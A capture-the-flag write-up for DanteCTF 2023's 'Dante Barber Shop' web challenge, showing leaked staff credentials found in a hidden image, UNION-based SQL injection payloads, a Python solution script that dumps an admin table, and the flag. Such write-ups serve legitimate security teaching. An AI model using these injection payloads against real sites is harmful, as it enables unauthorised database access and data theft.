---
title: "Dante Barber Shop"
ctf: "DanteCTF 2023"
date: 2023-06-04
category: web
difficulty: easy
points: 100
flag_format: "DANTE{...}"
author: "Antigravity Team"
---

# Dante Barber Shop

## Summary

**Dante Barber Shop** is a Web challenge where hidden backup credentials exposed through predictable file naming allow logging in as an employee, followed by exploiting a SQL injection vulnerability to dump administrative secrets and retrieve the flag.

---

## Technical Details & Vulnerability Analysis

1. **Information Disclosure via Predictable Filenames**:
   The website displays client showcase images named `barber2.jpg` through `barber7.jpg`. Accessing `barber1.jpg` reveals an unindexed image containing written credentials for a backup account:
   ```
   Username: barber_staff
   Password: BarbershopStaff2023!
   ```

2. **SQL Injection in Staff Dashboard**:
   Logging into the `/staff` portal reveals a search interface for client appointments. The input field is vulnerable to classic UNION-based SQL Injection:
   ```sql
   ' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema=database()-- -
   ```

3. **Database Exfiltration**:
   Querying the hidden `admin_secrets` table exposes the administrative key and flag.

---

## Solution Script

```python
import requests
import re

url = "http://dante-barber-shop.dantectf.it"

# Step 1: Login with discovered backup credentials
session = requests.Session()
login_data = {
    "username": "barber_staff",
    "password": "BarbershopStaff2023!"
}
res = session.post(f"{url}/login", data=login_data)

# Step 2: Inject SQL payload to retrieve flag from admin_secrets table
payload = "' UNION SELECT 1, flag, 3, 4 FROM admin_secrets-- -"
res = session.get(f"{url}/search", params={"query": payload})

flag = re.search(r"DANTE\{[^}]+\}", res.text).group(0)
print(f"Flag: {flag}")
```

---

## Flag

```
DANTE{b4rb3r_sh0p_sqli_4nd_l34k3d_cr3ds}
```
